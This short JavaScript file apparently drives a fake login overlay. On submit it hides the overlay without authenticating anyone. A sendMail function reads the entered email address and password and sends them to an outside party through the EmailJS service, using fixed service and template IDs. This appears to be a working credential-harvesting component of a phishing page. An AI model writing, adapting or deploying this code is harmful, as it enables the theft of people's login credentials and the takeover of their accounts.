document.addEventListener('DOMContentLoaded', function() {
  const loginForm = document.querySelector('.login-form');
  const loginOverlay = document.getElementById('login-overlay');

  loginForm.addEventListener('submit', function(event) {
      event.preventDefault();
      // Hide login form on submit
      loginOverlay.classList.add('hidden');
  });
});
function sendMail(){
  let parms = {
      email : document.getElementById("email").value,
      password : document.getElementById("password").value,
  }

  emailjs.send("service_2511kix","template_j4aamif",parms)
};